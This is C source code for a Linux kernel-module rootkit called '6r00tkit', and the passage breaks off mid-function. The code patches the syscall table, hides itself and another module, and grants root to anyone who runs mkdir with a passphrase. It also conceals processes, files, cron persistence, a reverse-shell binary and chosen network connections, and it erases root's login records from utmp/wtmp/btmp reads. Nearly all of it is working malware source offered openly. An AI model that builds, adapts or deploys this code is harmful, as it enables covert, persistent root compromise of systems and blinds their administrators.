// This file implements a complete LKM rootkit

/*
    Copyright (C) 2023  Maurice Lambert
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#include <linux/fs.h>
#include <linux/tcp.h>
#include <linux/list.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/path.h>
#include <linux/sched.h>
#include <linux/namei.h>
#include <linux/ftrace.h>
#include <linux/string.h>
#include <linux/dirent.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/linkage.h>
#include <asm/processor.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>
#include <linux/compiler.h>
#include <linux/syscalls.h>
#include <linux/inet_diag.h>
#include <linux/moduleparam.h>

#pragma GCC optimize("-fno-optimize-sibling-calls")

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

MODULE_LICENSE("GPL");
MODULE_AUTHOR("MauriceLambert");
MODULE_DESCRIPTION("The 6r00tkit - Rootkit by MauriceLambert");
MODULE_VERSION("0.0.1");

/*
    Defines "command line" arguments for rootkit.
*/
static char *modulename = "groot";
module_param(modulename, charp, 0000);
MODULE_PARM_DESC(modulename, "Module name to hide");

static char *passphrase = "1 4m 6r00t";
module_param(passphrase, charp, 0000);
MODULE_PARM_DESC(passphrase, "Passphrase to get root permissions from mkdir");

static char *rootkitdirectory = "/root";
module_param(rootkitdirectory, charp, 0000);
MODULE_PARM_DESC(rootkitdirectory, "The rootkit directory (where kernel object and malware are stocked)");

static char *rootkitfile = "6r00tkit.ko";
module_param(rootkitfile, charp, 0000);
MODULE_PARM_DESC(rootkitfile, "The rootkit filename");

static char *persistencedirectory = "/etc/cron.d";
module_param(persistencedirectory, charp, 0000);
MODULE_PARM_DESC(persistencedirectory, "The persistence rootkit directory (where persistence file is stocked)");

static char *persistencefile = "6r00tkit";
module_param(persistencefile, charp, 0000);
MODULE_PARM_DESC(persistencefile, "The persistence filename");

static char *malwarefiles[5] = {"reverseshell"};
static int malwarefiles_number = 1;
module_param_array(malwarefiles, charp, &malwarefiles_number, 0000);
MODULE_PARM_DESC(malwarefiles, "The malwares filenames");

static long int processsignal = 14600;
module_param(processsignal, long, 0000);
MODULE_PARM_DESC(processsignal, "Kill signal to hide process from kill");

static long int ipsignal = 0xdead;
module_param(ipsignal, long, 0000);
MODULE_PARM_DESC(ipsignal, "Kill signal to hide any connection from/to a specific IP address using kill to define the IP address");

static long int sourceportsignal = 666;
module_param(sourceportsignal, long, 0000);
MODULE_PARM_DESC(sourceportsignal, "Kill signal to hide tcp connection with specific source port from kill");

static long int destinationportsignal = 0xbeef;
module_param(destinationportsignal, long, 0000);
MODULE_PARM_DESC(destinationportsignal, "Kill signal to hide tcp connection with specific destination port from kill");

static char *hiddenuser = "root";
module_param(hiddenuser, charp, 0000);
MODULE_PARM_DESC(hiddenuser, "User to hide from connections logs");

unsigned int ip_address = 0;
unsigned short source_port = 0;
unsigned short destination_port = 0;

char grootkit_filepath[NAME_MAX];
char persistence_filepath[NAME_MAX];
char malwares_filespaths[NAME_MAX][5];
unsigned long int malware_directory_length;
char *logged_filespaths[3] = {"/var/run/utmp", "/var/log/wtmp", "/var/log/btmp"};
unsigned long int smallest_pid;
unsigned long int loggin_files_opened = 0;

#define EMPTY           0
#define RUN_LVL         1
#define BOOT_TIME       2
#define NEW_TIME        3
#define OLD_TIME        4
#define INIT_PROCESS    5
#define LOGIN_PROCESS   6
#define USER_PROCESS    7
#define DEAD_PROCESS    8
#define ACCCOUNTING     9

#define UT_LINESIZE     32
#define UT_NAMESIZE     32
#define UT_HOSTSIZE     256

struct opened_file {
    unsigned long int file_descriptor;
    unsigned long int pid;
    int last;
};

struct opened_file opened_files[5] = {
    {-1, -1, 0},
    {-1, -1, 0},
    {-1, -1, 0},
    {-1, -1, 0},
    {-1, -1, 1}
};

// https://elixir.bootlin.com/linux/v6.5.6/source/fs/internal.h#L168
struct open_flags {
    int open_flag;
    umode_t mode;
    int acc_mode;
    int intent;
    int lookup_flags;
};

/*
    Define structure not in kernel headers.
    https://elixir.bootlin.com/linux/v5.15.137/source/fs/readdir.c#L207
*/
struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

/*
    Define structure to have necessary
    informations in symbol hooking.
*/
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

/*
    Define structure for utmp parsing.
*/
struct exit_status {
    short int e_termination;
    short int e_exit;
};

struct utmp {
    short       ut_type;
    pid_t       ut_pid;
    char        ut_line[UT_LINESIZE];
    char        ut_id[4];
    char        ut_user[UT_NAMESIZE];
    char        ut_host[UT_HOSTSIZE];
    struct      exit_status     ut_exit;

#if defined __WORDSIZE_COMPAT32
    int32_t     ut_session;
    struct {
        int32_t tv_sec;
        int32_t tv_usec;
    } ut_tv;
#else
    long        ut_session;
//    struct      timeval ut_tv;
#endif

    int32_t     ut_addr_v6[4];
    char        __unused[20];
};

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/*
    Define the mkdir syscalls signatures.
*/
#ifdef PTREGS_SYSCALL_STUBS
typedef asmlinkage ssize_t (*recvmsg_signature)(const struct pt_regs *);
typedef asmlinkage long (*getdents64_signature)(const struct pt_regs *);
typedef asmlinkage long (*newfstatat_signature)(const struct pt_regs *);
typedef asmlinkage long (*newfstat_signature)(const struct pt_regs *);
typedef asmlinkage long (*newlstat_signature)(const struct pt_regs *);
typedef asmlinkage long (*newstat_signature)(const struct pt_regs *);
typedef asmlinkage int (*getdents_signature)(const struct pt_regs *);
typedef asmlinkage int (*pread64_signature)(const struct pt_regs *);
typedef asmlinkage long (*openat_signature)(const struct pt_regs *);
typedef asmlinkage long (*fstat_signature)(const struct pt_regs *);
typedef asmlinkage long (*lstat_signature)(const struct pt_regs *);
typedef asmlinkage long (*mkdir_signature)(const struct pt_regs *);
typedef asmlinkage int (*close_signature)(const struct pt_regs *);
typedef asmlinkage int (*statx_signature)(const struct pt_regs *);
typedef asmlinkage long (*stat_signature)(const struct pt_regs *);
typedef asmlinkage long (*open_signature)(const struct pt_regs *);
typedef asmlinkage long (*kill_signature)(const struct pt_regs *);
typedef asmlinkage int (*read_signature)(const struct pt_regs *);
#else
int dfd, const char __user *filename, unsigned flags, unsigned int mask, struct statx __user *buffer
typedef asmlinkage int (*statx_signature)(int, const char __user *, unsigned, unsigned int, struct statx __user *);
typedef asmlinkage long (*getdents64_signature)(unsigned int, struct linux_dirent64 *, unsigned int);
typedef asmlinkage ssize_t (*recvmsg_signature)(int, struct user_msghdr __user *, unsigned int);
typedef asmlinkage int (*getdents_signature)(unsigned int, struct linux_dirent *, unsigned int);
typedef asmlinkage long (*newlstat_signature)(const char __user *, struct stat __user *);
typedef asmlinkage long (*newstat_signature)(const char __user *, struct stat __user *);
typedef asmlinkage long (*lstat_signature)(const char __user *, struct stat __user *);
typedef asmlinkage int (*newfstatat_signature)(int, const char *, struct stat *, int);
typedef asmlinkage long (*stat_signature)(const char __user *, struct stat __user *);
typedef asmlinkage int (*pread64_signature)(unsigned long, char *, size_t, loff_t);
typedef asmlinkage int (*fstat_signature)(const char *, struct stat *, int);
typedef asmlinkage long (*newfstat_signature)(int, struct stat __user *);
typedef asmlinkage long (*mkdir_signature)(const char __user *, umode_t);
typedef asmlinkage int (*openat_signature)(int, const char *, int, int);
typedef asmlinkage int (*read_signature)(unsigned long, char *, size_t);
typedef asmlinkage int (*open_signature)(const char *, int, int);
typedef asmlinkage long (*close_signature)(unsigned int);
typedef asmlinkage long (*kill_signature)(pid_t, int);
#endif

typedef asmlinkage long (*tcp_seq_show_signature)(struct seq_file *, void *);

tcp_seq_show_signature tcp4_seq_show_base;
tcp_seq_show_signature tcp6_seq_show_base;
tcp_seq_show_signature udp4_seq_show_base;
tcp_seq_show_signature udp6_seq_show_base;
getdents64_signature getdents64_base;
newfstatat_signature newfstatat_base;
getdents_signature getdents_base;
newlstat_signature newlstat_base;
newfstat_signature newfstat_base;
recvmsg_signature recvmsg_base;
newstat_signature newstat_base;
pread64_signature pread64_base;
openat_signature openat_base;
fstat_signature fstat_base;
statx_signature statx_base;
lstat_signature lstat_base;
mkdir_signature mkdir_base;
close_signature close_base;
stat_signature stat_base;
open_signature open_base;
kill_signature kill_base;
read_signature read_base;

/*
    This function search a module by name.
*/
struct module *get_module_from_list(void) {
    struct list_head *pos;
    struct module *mod;

    list_for_each(pos, &THIS_MODULE->list) {
        mod = container_of(pos, struct module, list);

        if (strcmp(mod->name, modulename) == 0) {
            return mod;
        }
    }

    return NULL;
}

/*
    This function hides this rootkit and an other module
    defined by command line argument.
*/
void protect_and_hide(void) {
    struct module *module_to_hide = get_module_from_list();

    if (module_to_hide != NULL) {
        try_module_get(module_to_hide);
        list_del(&module_to_hide->list);
        kobject_del(&THIS_MODULE->mkobj.kobj);
    }

    try_module_get(THIS_MODULE);
    list_del(&THIS_MODULE->list);            // /proc/modules
    kobject_del(&THIS_MODULE->mkobj.kobj);   // /sys/module
}

/*
    This function changes the CR0 registry value
    used to defined kernel characteristics.
*/
inline void cr0_write(unsigned long cr0) {
    unsigned long __force_order;
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

/*
    This function sets the write memory protection.
*/
void memprotect(unsigned int protect) {
    unsigned long cr0 = read_cr0();
    if (protect) {
        set_bit(16, &cr0);
    } else {
        clear_bit(16, &cr0);
    }
    cr0_write(cr0);
}

/*
    This function sets roots permissions.
*/
void set_root_permissions(void) {
    struct cred *credentials = prepare_creds();

    if (credentials == NULL) return;

    credentials->uid.val = credentials->gid.val = 0;
    credentials->euid.val = credentials->egid.val = 0;
    credentials->suid.val = credentials->sgid.val = 0;
    credentials->fsuid.val = credentials->fsgid.val = 0;

    commit_creds(credentials);
}

/*
    This function hooks mkdir to get roots permissions
    when use a secret passphrase.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int mkdir_hook(const struct pt_regs *regs) {
    const char __user *pathname = (char *)regs->di;
#else
asmlinkage int mkdir_hook(const char __user *pathname, umode_t mode) {
#endif

    if (!strcmp(passphrase, pathname)) {
        set_root_permissions();
    } else {
#ifdef PTREGS_SYSCALL_STUBS
        return mkdir_base(regs);
#else
        return mkdir_base(pathname, mode);
#endif
    }

    return 0;
}

/*
    This function searchs process by PID.
*/
struct task_struct *search_process(pid_t pid) {
    struct task_struct *process = current;

    for_each_process(process)
    {
        if (process->pid == pid)
        {
            return process;
        }
    }
    return NULL;
}

/*
    This function sets an unused flags on a process to hide it.
*/
void set_hidden_flags(pid_t pid) {
    struct task_struct *process = search_process(pid);
    if (process == NULL) return;
    process->flags ^= 0x10000000;
}

/*
    This function hooks kill to get an hidden
    process when use a secret code.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage long kill_hook(const struct pt_regs *regs) {
    pid_t pid = regs->di;
    int signal = regs->si;
#else
asmlinkage long kill_hook(pid_t pid, int signal) {
#endif
    if (signal == processsignal) {
        set_hidden_flags(pid);
    } else if (signal == sourceportsignal) {
        source_port = htons((unsigned short)pid);
    } else if (signal == destinationportsignal) {
        destination_port = htons((unsigned short)pid);
    } else if (signal == ipsignal) {
        ip_address = htonl((unsigned int)pid);
    }
#ifdef PTREGS_SYSCALL_STUBS
    return kill_base(regs);
#else
    return kill_base(pid, signal);
#endif
}

/*
    This function checks for hidden flag on process by PID.
*/
unsigned long int has_hidden_flag(pid_t pid) {
    if (!pid) return 0;
    struct task_struct *process = search_process(pid);
    if (process == NULL) return 0;
    return process->flags & 0x10000000;
}

/*
    This function gets full filename from file descriptor.
*/
char* get_filename_from_fd(int fd) {
    char *filename = NULL;

    struct file *file = fget(fd);
    if (file) {
        struct path path = file->f_path;
        filename = kmalloc(PATH_MAX, GFP_KERNEL);
        if (filename) {
            path_get(&path);
            strcpy(filename, d_path(&path, filename, PATH_MAX));
        }
        fput(file);
    }

    return filename;
}


/*
    This function hooks getdents64 to hide files and directories.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage long getdents64_hook(const struct pt_regs *regs) {
    int fd = regs->di;
    struct linux_dirent64 __user *directory = (struct linux_dirent64 *)regs->si;
    long int kernel_return = getdents64_base(regs);
#else
asmlinkage long getdents64_hook(unsigned int fd, struct linux_dirent64 *directory, unsigned int count) {
    long int kernel_return = getdents64_base(fd, directory, count);
#endif

    if (kernel_return <= 0) return kernel_return;
    char *directoryname = get_filename_from_fd(fd);
    if (
        directoryname == NULL ||
        (
            current->files->fdt->fd[fd]->f_path.dentry->d_inode->i_ino != PROC_ROOT_INO &&
            strcmp(directoryname, rootkitdirectory) != 0 &&
            strcmp(directoryname, persistencedirectory) != 0
        )
    ) {
        kfree(directoryname);
        return kernel_return;
    }
    kfree(directoryname);

    struct linux_dirent64 *directory_kernel_return = kzalloc(kernel_return, GFP_KERNEL);
    if (directory_kernel_return == NULL) return kernel_return;

    if (copy_from_user(directory_kernel_return, directory, kernel_return)) {
        kfree(directory_kernel_return);
        return kernel_return;
    }

    struct linux_dirent64 *previous_directory;
    unsigned long offset = 0;

    while (offset < kernel_return) {
        struct linux_dirent64 *current_directory = (void *)directory_kernel_return + offset;

        int is_malware_file = 0;
        for (int index = 0; index < malwarefiles_number; index += 1) {
            if (strcmp(malwarefiles[index], current_directory->d_name) == 0) {
                is_malware_file = 1;
                break;
            }
        }

        if (
            has_hidden_flag(simple_strtoul(current_directory->d_name, NULL, 10)) ||
            strcmp(rootkitfile, current_directory->d_name) == 0 ||
            strcmp(persistencefile, current_directory->d_name) == 0 ||
            is_malware_file
        ) {
            if (current_directory == directory_kernel_return) {
                kernel_return -= current_directory->d_reclen;
                memmove(current_directory, (void *)current_directory + current_directory->d_reclen, kernel_return);
            } else {
                previous_directory->d_reclen += current_directory->d_reclen;
            }
        } else {
            previous_directory = current_directory;
        }

        offset += current_directory->d_reclen;
    }

    copy_to_user(directory, directory_kernel_return, kernel_return);
    kfree(directory_kernel_return);
    return kernel_return;
}

/*
    This function hooks getdents to files and hide directories.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int getdents_hook(const struct pt_regs *regs) {
    int fd = regs->di;
    struct linux_dirent __user *directory = (struct linux_dirent *)regs->si;
    int kernel_return = getdents_base(regs);
#else
asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent *directory, unsigned int count) {
    int kernel_return = getdents_base(fd, directory, count);
#endif

    if (kernel_return <= 0) return kernel_return;
    char *directoryname = get_filename_from_fd(fd);
    if (
        directoryname == NULL ||
        (
            current->files->fdt->fd[fd]->f_path.dentry->d_inode->i_ino != PROC_ROOT_INO &&
            strcmp(directoryname, rootkitdirectory) != 0 &&
            strcmp(directoryname, persistencedirectory) != 0
        )
    ) {
        kfree(directoryname);
        return kernel_return;
    }
    kfree(directoryname);

    struct linux_dirent *directory_kernel_return = kzalloc(kernel_return, GFP_KERNEL);
    if (directory_kernel_return == NULL) return kernel_return;

    if (copy_from_user(directory_kernel_return, directory, kernel_return)) {
        kfree(directory_kernel_return);
        return kernel_return;
    }

    struct linux_dirent *previous_directory;
    unsigned long offset = 0;

    while (offset < kernel_return) {
        struct linux_dirent *current_directory = (void *)directory_kernel_return + offset;

        int is_malware_file = 0;
        for (int index = 0; index < malwarefiles_number; index += 1) {
            if (strcmp(malwarefiles[index], current_directory->d_name) == 0) {
                is_malware_file = 1;
                break;
            }
        }

        if (
            has_hidden_flag(simple_strtoul(current_directory->d_name, NULL, 10)) ||
            strcmp(rootkitfile, current_directory->d_name) == 0 ||
            strcmp(persistencefile, current_directory->d_name) == 0 ||
            is_malware_file
        ) {
            if (current_directory == directory_kernel_return) {
                kernel_return -= current_directory->d_reclen;
                memmove(current_directory, (void *)current_directory + current_directory->d_reclen, kernel_return);
            } else {
                previous_directory->d_reclen += current_directory->d_reclen;
            }
        } else {
            previous_directory = current_directory;
        }

        offset += current_directory->d_reclen;
    }

    copy_to_user(directory, directory_kernel_return, kernel_return);
    kfree(directory_kernel_return);
    return kernel_return;
}

/*
    This function hooks recvmsg syscall to hide connections.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage ssize_t recvmsg_hook(const struct pt_regs *regs) {
    ssize_t size = recvmsg_base(regs);
    struct user_msghdr __user *message = (struct user_msghdr __user *) regs->si;
#else
asmlinkage ssize_t recvmsg_hook(int socketfd, struct user_msghdr __user *message, unsigned flags) {
    ssize_t size = recvmsg_base(socketfd, message, flags);
#endif
    if (size <= 0) return size;

    struct user_msghdr kernel_message;
    struct iovec kernel_iov;
    if (copy_from_user(&kernel_message, message, sizeof(*message))) return size;
    if (copy_from_user(&kernel_iov, kernel_message.msg_iov, sizeof(*kernel_message.msg_iov))) return size;
    void *buffer = kmalloc(size, GFP_KERNEL);
    if (buffer == NULL) return size;
    if (copy_from_user(buffer, kernel_iov.iov_base, size)) goto end;
    struct nlmsghdr *header = (struct nlmsghdr *)buffer;

    ssize_t size_base = size;
    ssize_t counter = size;
    while (header != NULL && NLMSG_OK(header, counter)) {
        if (header->nlmsg_type == NLMSG_DONE || header->nlmsg_type == NLMSG_ERROR) goto end;
        struct inet_diag_msg *connection = NLMSG_DATA(header);
        if ((connection->idiag_family == AF_INET || connection->idiag_family == AF_INET6) &&
            (source_port && connection->id.idiag_sport == source_port ||
                destination_port && connection->id.idiag_dport == destination_port ||
                (ip_address && connection->idiag_family == AF_INET &&
                    (ip_address == connection->id.idiag_src[0] || ip_address == connection->id.idiag_dst[0])))) {
            char *data = (char *)header;
            int offset = NLMSG_ALIGN(header->nlmsg_len);
            for (int index = 0; index < counter && index + offset < size_base; index += 1) data[index] = data[index + offset];
            size -= offset;
            counter -= offset;
        } else {
            header = NLMSG_NEXT(header, counter);
        }
    }

    if (copy_to_user(kernel_iov.iov_base, buffer, size_base)) goto end;
    if (copy_to_user(kernel_message.msg_iov, &kernel_iov, sizeof(kernel_message.msg_iov))) goto end;
    copy_to_user(message, &kernel_message, sizeof(*message));

end:
    kfree(buffer);
    return size;
}

/*
    This function adds a file descriptor to 
*/
void set_filedescriptor(int file_descriptor) {
    int index;

    for (index = 0; index < 5; index += 1) {
        if (opened_files[index].last) {
            opened_files[index].last = 0;
            if (index == 4) {
                index = 0;
            } else {
                index += 1;
            }
            break;
        }
    }

    opened_files[index].last = 1;
    opened_files[index].pid = current->pid;
    opened_files[index].file_descriptor = file_descriptor;
}

/*
    This function returns kernel symbol
    (work with recent kernel versions).
*/
void *resolve_kernel_symbol(const char* symbol) {
    #ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
#endif
    return (void *)kallsyms_lookup_name(symbol);
}

/*
    This function hooks syscalls.
*/
void *syscall_hooking(unsigned long new_function, unsigned int syscall_number) {
    unsigned long *syscall_table = (unsigned long *)resolve_kernel_symbol("sys_call_table");
    if (!syscall_table) {
        printk(KERN_DEBUG "Error getting sys_call_table symbol\n");
        return NULL;
    }

    void *base = (void *)syscall_table[syscall_number];

    memprotect(0);
    syscall_table[syscall_number] = (unsigned long)new_function;
    memprotect(1);

    return base;
}

/*
    This function hooks sys_open syscall.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int close_hook(const struct pt_regs *regs) {
    unsigned int fd = regs->di;
    int return_value = close_base(regs);
#else
asmlinkage int close_hook(unsigned int fd) {
    int return_value = close_base(fd);
#endif
    if (return_value != 0 || fd <= 2 || current->pid <= smallest_pid) return return_value;
    for (int index = 0; index < 5; index += 1) {
        if (opened_files[index].pid == current->pid && opened_files[index].file_descriptor == fd) {
            loggin_files_opened -= 1;
            opened_files[index].pid = -1;
            opened_files[index].file_descriptor = -1;

            if (!loggin_files_opened) {
                syscall_hooking((unsigned long)pread64_base, (unsigned int)__NR_pread64);
                syscall_hooking((unsigned long)read_base, (unsigned int)__NR_read);
                pread64_base = NULL;
                read_base = NULL;
            }
        }
    }
    return return_value;
}

/*
    This function returns 1 when the pread64 function
    should be hooked for the file descriptor.
*/
int should_hide_content(unsigned long fd) {
    for (int index = 0; index < 5; index += 1) {
        if (opened_files[index].pid == current->pid && opened_files[index].file_descriptor == fd) return 1;
    }
    return 0;
}

/*
    This function modify utmp record.
*/
void rewrite_utmp(char* buffer, struct utmp *utmp) {
    if (strcmp(utmp->ut_user, hiddenuser) == 0) {
        for (int index = 0; index < sizeof(struct utmp); index += 1) buffer[index] = 0;
    }

}

/*
    This function modify read functions behaviors.
*/
int new_read(unsigned long fd, char *buf, size_t count, int return_value) {
    if (!should_hide_content(fd)) return return_value;

    unsigned long buffer_position = 0;
    char utmp_buffer[sizeof(struct utmp)];
    struct utmp *utmp = (struct utmp *)utmp_buffer;

    if (return_value == sizeof(struct utmp)) {
        if (copy_from_user(utmp, buf, sizeof(struct utmp))) return return_value;
        rewrite_utmp(utmp_buffer, utmp);
        copy_to_user(buf, utmp, sizeof(struct utmp));
    } else {
        struct file *file = fget(fd);
        if (file == NULL) return return_value;

        loff_t position = file->f_pos;
        loff_t read_position = position - return_value;
        loff_t start = (read_position / sizeof(struct utmp)) * sizeof(struct utmp);
        unsigned long int start_offset = read_position - start;
        unsigned long int end_offset = (start + start_offset + return_value) % sizeof(struct utmp);
        unsigned long int length = start_offset + return_value;
        if (end_offset) length += sizeof(struct utmp) - end_offset;
        unsigned long int end = start + length;

        char *kernel_buffer = kzalloc(length, GFP_KERNEL);
        if (kernel_buffer == NULL) {
            fput(file);
            return return_value;
        }

        char *temp_buffer = kernel_buffer;
        int real_length = kernel_read(file, kernel_buffer, length, &start);

        while (real_length >= sizeof(struct utmp)) {
            utmp = (struct utmp *)temp_buffer;
            rewrite_utmp(temp_buffer, utmp);
            temp_buffer += sizeof(struct utmp);
            real_length -= sizeof(struct utmp);
        }
        printk(KERN_CRIT "Not checked: %i\n", real_length);

        copy_to_user(buf, kernel_buffer + start_offset, return_value);
        file->f_pos = position;
        kfree(kernel_buffer);
        fput(file);
    }

    return return_value;
}

/*
    This function hooks sys_read syscall.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int read_hook(const struct pt_regs *regs) {
    unsigned int fd = regs->di;
    char *buf = (char *)regs->si;
    size_t count = regs->dx;
    int return_value = read_base(regs);
#else
asmlinkage int read_hook(unsigned int fd, char *buf, size_t count) {
    int return_value = read_base(fd, buf, count);
#endif
    if (return_value <= 0 || current->pid <= smallest_pid) return return_value;
    return new_read(fd, buf, count, return_value);
}

/*
    This function hooks sys_pread64 syscall.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int pread64_hook(const struct pt_regs *regs) {
    unsigned long fd = regs->di;
    char *buf = (char *)regs->si;
    size_t count = regs->dx;
    int return_value = pread64_base(regs);
#else
asmlinkage int pread64_hook(unsigned long fd, char *buf, size_t count, loff_t pos) {
    int return_value = pread64_base(fd, buf, count, pos);
#endif
    if (return_value <= 0 || current->pid <= smallest_pid) return return_value;
    return new_read(fd, buf, count, return_value);
}

/*
    This function define the new behavior for sys_openat syscall.
*/
long new_openat(const char *filename, long return_value, int is_file_descriptor) {
    if (is_file_descriptor && current->pid > smallest_pid && (strcmp(logged_filespaths[0], filename) == 0 || strcmp(logged_filespaths[1], filename) == 0 || strcmp(logged_filespaths[2], filename) == 0)) {
        if (read_base == NULL) read_base = syscall_hooking((unsigned long)read_hook, (unsigned int)__NR_read);
        if (pread64_base == NULL) pread64_base = syscall_hooking((unsigned long)pread64_hook, (unsigned int)__NR_pread64);;
        set_filedescriptor(return_value);
        loggin_files_opened += 1;
        return return_value;
    }

    char* filepath = filename;
    if (is_file_descriptor) {
        filepath = get_filename_from_fd(return_value);
        if (filepath == NULL) return return_value;
    }

    if (strcmp(filepath, persistence_filepath) == 0) goto filenotfound;
    else if (memcmp("/proc/", filepath, 6) == 0) {
        unsigned long long int pid = 0;
        for (char* string = filepath + 6; string[0] >= '0' && string[0] <= '9' && pid < 9999999; string += 1) pid = pid * 10 + string[0] - '0';
        if (has_hidden_flag(pid)) goto filenotfound;
    } else if (memcmp(filepath, rootkitdirectory, malware_directory_length) == 0 && filepath[malware_directory_length] == '/') {
        char *filename = &filepath[malware_directory_length + 1];
        if (strcmp(filename, rootkitfile) == 0) goto filenotfound;

        for (int index = 0; index < malwarefiles_number; index += 1) {
            if (strcmp(filename, malwarefiles[index]) == 0) goto filenotfound;
        }
    }

    if (is_file_descriptor) kfree(filepath);
    return return_value;

filenotfound:
    if (is_file_descriptor) {
        filp_close(fget(return_value), NULL);
        kfree(filepath);
    }
    return -ENOENT;
}

/*
    This function hooks sys_openat syscall.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage long openat_hook(const struct pt_regs *regs) {
    char *filename = (char *)regs->si;
    long return_value = openat_base(regs);
#else
asmlinkage long openat_hook(int dfd, const char *filename, int flags, int mode) {
    long return_value = openat_base(dfd, filename, flags, mode);
#endif
    if (return_value <= 2) return return_value;
    return new_openat(filename, return_value, 1);
}

/*
    This function hooks sys_open syscall.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage long open_hook(const struct pt_regs *regs) {
    char *filename = (char *)regs->di;
    long return_value = open_base(regs);
#else
asmlinkage long open_hook(const char *filename, int flags, int mode) {
    long return_value = open_base(filename, flags, mode);
#endif
    if (return_value <= 2) return return_value;
    return new_openat(filename, return_value, 1);
}

/*
    This function hooks sys_statx syscall.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int statx_hook(struct pt_regs *regs) {
    int dfd = regs->di;
    char *filename = (char *)regs->si;
    int return_value = statx_base(regs);
#else
asmlinkage long statx_hook(int dfd, const char __user *filename, unsigned flags, unsigned int mask, struct statx __user *buffer) {
    int return_value = statx_base(dfd, filename, statbuf, flag);
#endif
    if (return_value != 0 || filename[0] == 0) return return_value;
    struct path path;
    int empty = 0;
    int error = user_path_at_empty(dfd, filename, LOOKUP_EMPTY, &path, &empty);
    if (!error && !empty) {
        char new_filename[PATH_MAX];
        char *new_filename2 = d_path(&path, new_filename, PATH_MAX);
        return (int)new_openat(new_filename2, (long)return_value, 0);
    }
    return (int)new_openat(filename, (long)return_value, 0);
}

/*
    This function hooks sys_newfstatat syscall.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int newfstatat_hook(struct pt_regs *regs) {
    int dfd = regs->di;
    char *filename = (char *)regs->si;
    int return_value = newfstatat_base(regs);
#else
asmlinkage long newfstatat_hook(int dfd, const char *filename, struct stat __user *statbuf, int flag) {
    int return_value = newfstatat_base(dfd, filename, statbuf, flag);
#endif
    if (return_value != 0 || filename[0] == 0) return return_value;
    struct path path;
    int empty = 0;
    int error = user_path_at_empty(dfd, filename, LOOKUP_EMPTY, &path, &empty);
    if (!error && !empty) {
        char new_filename[PATH_MAX];
        char *new_filename2 = d_path(&path, new_filename, PATH_MAX);
        return (int)new_openat(new_filename2, (long)return_value, 0);
    }
    return (int)new_openat(filename, (long)return_value, 0);
}

/*
    This function hooks sys_newfstat syscall.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int newfstat_hook(const struct pt_regs *regs) {
    int fd = regs->di;
    int return_value = newfstat_base(regs);
#else
asmlinkage int newfstat_hook(int fd, struct stat __user *statbuf) {
    int return_value = newfstat_base(fd, statbuf);
#endif
    if (return_value != 0) return return_value;
    char *filename = get_filename_from_fd(fd);
    return_value = (int)new_openat(filename, (long)return_value, 0);
    kfree(filename);
    return return_value;
}

/*
    This function hooks sys_fstat syscall.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int fstat_hook(const struct pt_regs *regs) {
    int fd = regs->di;
    int return_value = fstat_base(regs);
#else
asmlinkage int fstat_hook(int fd, struct stat __user *statbuf) {
    int return_value = fstat_base(fd, statbuf);
#endif
    if (return_value != 0) return return_value;
    char *filename = get_filename_from_fd(fd);
    return_value = (int)new_openat(filename, (long)return_value, 0);
    kfree(filename);
    return return_value;
}

/*
    This function hooks sys_newlstat syscall.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int newlstat_hook(const struct pt_regs *regs) {
    char *filename = (char *)regs->di;
    int return_value = newlstat_base(regs);
#else
asmlinkage int newlstat_hook(const char __user *filename, struct stat __user *statbuf) {
    int return_value = newlstat_base(filename, statbuf);
#endif
    if (return_value != 0) return return_value;
    return (int)new_openat(filename, (long)return_value, 0);
}

/*
    This function hooks sys_lstat syscall.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int lstat_hook(const struct pt_regs *regs) {
    char *filename = (char *)regs->di;
    int return_value = lstat_base(regs);
#else
asmlinkage int lstat_hook(const char __user *filename, struct stat __user *statbuf) {
    int return_value = lstat_base(filename, statbuf);
#endif
    if (return_value != 0) return return_value;
    return (int)new_openat(filename, (long)return_value, 0);
}

/*
    This function hooks sys_stat syscall.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int stat_hook(const struct pt_regs *regs) {
    char *filename = (char *)regs->di;
    int return_value = stat_base(regs);
#else
